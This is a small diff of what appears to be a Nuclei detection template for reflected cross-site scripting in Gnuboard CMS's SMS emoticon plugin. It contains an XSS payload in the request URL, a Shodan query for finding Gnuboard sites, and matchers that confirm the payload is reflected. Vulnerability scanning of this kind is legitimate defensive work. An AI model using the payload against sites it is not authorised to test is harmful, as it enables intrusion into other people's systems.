@@ -1,5 +1,4 @@
 id: gnuboard-sms-xss
-
 info:
   name: Gnuboard CMS - SMS Emoticon XSS
   author: gy741
@@ -12,24 +11,20 @@ info:
     verified: true
     shodan-query: http.html:"Gnuboard"
   tags: xss,gnuboard
-
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>"
-
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
           - '"0nuboard<svg onload=alert(document.domain)>"'
-
       - type: word
         part: header
         words:
           - "text/html"
-
       - type: status
         status:
           - 200
